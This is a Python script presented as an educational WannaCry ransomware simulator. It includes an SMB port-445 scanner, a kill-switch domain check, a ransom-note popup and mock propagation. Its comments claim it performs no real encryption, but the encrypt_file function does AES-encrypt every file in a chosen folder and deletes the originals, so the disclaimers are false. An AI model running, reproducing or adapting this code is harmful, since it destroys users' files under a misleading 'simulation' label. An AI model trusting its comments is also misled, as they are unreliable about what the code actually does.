# This code simulates the WannaCry ransomware attack for educational purposes only.
# It does not perform any real encryption or malicious actions.
# Always use caution and ensure you have permission to test any systems.
# This script is intended for educational and research purposes only.
# Do not use it for illegal activities.     

import os
import sys
import socket
import logging
from time import sleep
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from tkinter import messagebox, Tk

# Setup logging
logging.basicConfig(filename='simulation.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# --- MS17-010 Scanner Simulation ---

def scan_target(ip, port=445):
    print(f"[*] Scanning {ip}:{port} for SMBv1 (MS17-010) vulnerability...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))

        if result == 0:
            print(f"[+] Port 445 is OPEN on {ip}")
            msg = f"Simulated SMBv1 detected on {ip} (Potentially vulnerable to MS17-010)"
            print("[!]", msg)
            logging.info(msg)
        else:
            print(f"[-] Port 445 is CLOSED on {ip}")
            logging.info(f"Port 445 closed on {ip}")

        sock.close()
    except socket.error as e:
        msg = f"Could not connect to {ip}: {e}"
        print("[-]", msg)
        logging.error(msg)

# --- Kill-Switch Domain Check ---

def check_kill_switch(domain):
    try:
        host = socket.gethostbyname(domain)
        msg = f"Kill-Switch Domain is Active: {domain} -> {host}"
        print("[*]", msg)
        logging.info(msg)
        return True
    except socket.error:
        msg = f"Kill-Switch Domain is Not Active: {domain}"
        print("[*]", msg)
        logging.info(msg)
        return False

# --- AES Encryption (Simulation) ---

def encrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()

        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        encrypted_file = filepath + ".locked"
        with open(encrypted_file, 'wb') as f:
            f.write(cipher.nonce + tag + ciphertext)

        os.remove(filepath)

        msg = f"Encrypted: {filepath} -> {encrypted_file}"
        print("[+]", msg)
        logging.info(msg)
    except Exception as e:
        msg = f"Failed to encrypt {filepath}: {e}"
        print("[-]", msg)
        logging.error(msg)

def simulate_encryption(target_dir):
    if not os.path.isdir(target_dir):
        msg = f"Target directory '{target_dir}' does not exist."
        print("[-]", msg)
        logging.error(msg)
        return

    key = get_random_bytes(16)
    print("[!]", f"AES Encryption Key (Simulated): {key.hex()}")
    logging.info(f"AES Encryption Key (Simulated): {key.hex()}")

    for filename in os.listdir(target_dir):
        filepath = os.path.join(target_dir, filename)
        if os.path.isfile(filepath) and not filename.endswith(".locked"):
            encrypt_file(filepath, key)

# --- Ransom Note (Fake GUI) ---

def show_ransom_note():
    note = """
    Ooops, your files have been encrypted!

    What Happened to My Computer?
    Your important files are encrypted. If you want to decrypt them,
    you need to pay a ransom in Bitcoin.

    (Simulation Only — No Real Encryption)
    """
    root = Tk()
    root.withdraw()
    messagebox.showwarning("WannaCry Ransomware Simulation", note)
    root.mainloop()

# --- Fake Propagation Simulation ---

def simulate_propagation(target_ips):
    print("[*] Simulating propagation to target IPs...")
    for ip in target_ips:
        msg = f"Pretending to propagate to {ip}..."
        print("[~]", msg)
        logging.info(msg)
        sleep(1)

# --- Main Program ---

def main():
    print("=== WannaCry PoC Full Simulator ===")

    if len(sys.argv) < 4:
        print("Usage: python wannacry_poc_full.py <target_folder> <kill_switch_domain> <target_ip_to_scan>")
        sys.exit(1)

    target_folder = sys.argv[1]
    kill_switch_domain = sys.argv[2]
    target_ip = sys.argv[3]

    # Step 1: Scan target IP for SMB vulnerability
    scan_target(target_ip)

    # Step 2: Check kill-switch domain
    if check_kill_switch(kill_switch_domain):
        print("[!] Kill-Switch Activated. Simulation Aborted.")
        logging.info("Simulation aborted due to active kill-switch.")
        return
    else:
        print("[!] Kill-Switch Not Active. Proceeding with Simulation...")
        logging.info("Kill-switch not active. Continuing simulation.")

    # Step 3: Simulate encryption on files
    simulate_encryption(target_folder)

    # Step 4: Show ransom note popup
    show_ransom_note()

    # Step 5: Simulate propagation to some IPs (hardcoded or could be extended)
    fake_ips = ['192.168.1.10', '192.168.1.15', '192.168.1.20']
    simulate_propagation(fake_ips)

if __name__ == "__main__":
    main()

